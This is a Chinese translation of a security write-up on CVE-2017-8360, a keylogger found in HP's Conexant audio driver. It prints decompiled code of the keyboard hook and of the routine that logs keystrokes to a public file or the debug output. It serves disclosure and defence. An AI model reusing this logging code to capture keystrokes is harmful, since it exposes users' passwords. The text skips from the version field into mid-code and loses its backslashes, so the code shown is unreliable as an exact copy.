# 【漏洞分析】CVE-2017-8360：惠普笔记本音频驱动内置键盘记录器后门分析（含PoC）
|
##### 译文声明
本文是翻译文章，文章来源：modzero.ch
原文地址：
译文仅供参考，具体内容表达以及含义原文为准。
****
**  
**
翻译：[ **童话**](http://bobao.360.cn/member/contribute?uid=2782911444)
投稿方式：发送邮件至linwei#360.cn，或登陆网页版在线投稿
**  
**
**传送门**
[**【安全预警】惠普笔记本音频驱动竟内置键盘记录器后门！**](http://bobao.360.cn/news/detail/4159.html)
**  
**
**漏洞概要**
**概述：** **瑞士安全公司Modzero的安全研究员Thorsten Schroeder在审查Windows Active
Domain的基础设施时发现惠普音频驱动中内置键盘记录器监控用户的所有按键输入。**
**CVE-ID：** CVE-2017-8360
**漏洞类型：** Covert Storage Channel（后门）
**漏洞等级：** 高危/中危
**漏洞产品：** 音频驱动程序（麦克风托盘程序）
**影响版本：** = 0 )
      {
        target = (cfg_HotKeyMicScancode >> 8 * 
          (cfg_HotKeyMicScancode_len - cfg_HotKeyMicScancode_len2));
        LODWORD(key_vk)     = _in_lParam_keystroke->vkCode;
        LODWORD(key_flags)  = _in_lParam_keystroke->flags;
        is_keyfoo           = _in_lParam_keystroke->flags & 1;
        is_keydown          = ~(key_flags >> 7) & 1;
    [*] send_to_dbglog(
          0x1D,
          L"Mic target 0x%x scancode 0x%x flags 0x%x extra 0x%x vk 0x%xn",
          target,
          _in_lParam_keystroke->scanCode,
          key_flags,
          _in_lParam_keystroke->dwExtraInfo,
          key_vk);
        conexant_handle_fn_keys(
          cfg_MicMuteScancodeSettings,
          is_keydown,
          key_stroke->scanCode,
          target,
          &cfg_HotKeyMicScancode_len,
          &cfg_HotKeyMicScancode_len2,
          1);
        if ( cfg_MicMuteScancodeSettings & 4 )
          conexant_handle_fn_keys(
            cfg_MicMuteScancodeSettings,
            is_keydown,
            key_stroke->scanCode,
            (cfg_HotKeyMicScancode2 >> 8 * 
                (cfg_HotKeyMicScancode2_len - cfg_HotKeyMicScancode2_len2)),
            &cfg_HotKeyMicScancode2_len,
            &cfg_HotKeyMicScancode2_len2,
            1);
        tmp = cfg_SpkMuteScancodeSettings;
        if ( cfg_SpkMuteScancodeSettings & 8 && is_keyfoo 
             || !(cfg_SpkMuteScancodeSettings & 8) )
        {
          conexant_handle_fn_keys(
            cfg_SpkMuteScancodeSettings,
            is_keydown,
            key_stroke->scanCode,
            (cfg_HotKeySpkScancode >> 8 * 
                (cfg_HotKeySpkScancode_len - cfg_HotKeySpkScancode_len2)),
            &dword_1402709C8,
            &dword_1402709CC,
            0);
          tmp = cfg_SpkMuteScancodeSettings;
        }
        if ( tmp & 4 && (tmp & 8 && is_keyfoo || !(tmp & 8)) )
          conexant_handle_fn_keys(
            tmp,
            is_keydown,
            key_stroke->scanCode,
            (cfg_HotKeySpkScancode2 >> 8 * 
                (cfg_HotKeySpkScancode2_len - cfg_HotKeySpkScancode2_len2)),
            &cfg_HotKeySpkScancode2_len,
            &cfg_HotKeySpkScancode2_len2,
            0);
      }
      return CallNextHookEx(hhk, nCode, wParam, key_stroke);
    }
在[*]中调用的函数将每个按键信息写入文件，或通过如下Microsoft Debug监视器API store_keystroke()进行广播：
    void store_keystroke(LPCVOID lpBuffer)
    {
      WORD *scancode_logline;
      int64 str_len;
      DWORD NumberOfBytesWritten;
      int str_newline; 
      scancode_logline = lpBuffer;
      if ( g_write_to_logfile )
      {
        SetFilePointer(g_hFile, 0, 0, 2);
        str_len = -1;
        while ( scancode_logline[str_len++ + 1] != 0 )
          ;
        WriteFile(
          g_hFile, 
          scancode_logline, 
          2 * str_len, 
          &NumberOfBytesWritten, 
          0);
        str_newline = 'nr';
        WriteFile(g_hFile, &str_newline, 4, &NumberOfBytesWritten, 0);
      }
      else
      {
        OutputDebugStringW(lpBuffer);
      }
    }
该漏洞导致了一个非常高的风险，用户输入的敏感信息或者操作都有可能被泄露。这些信息会被记录在C:UsersPublicMicTray.log中，或者通过调用MapViewOfFile()函数读取。
可以访问未加密文件系统的相关工作人员也可以恢复历史键盘记录的敏感数据。用户没有意识到当输入敏感信息（如本地、远程系统的登录密码）的时候，键盘输入的内容会被Conexant的音频驱动程序包记录，而这些敏感的输入信息可以被任何进程或框架通过访问特定文件或调用MapViewOfFile
API访问。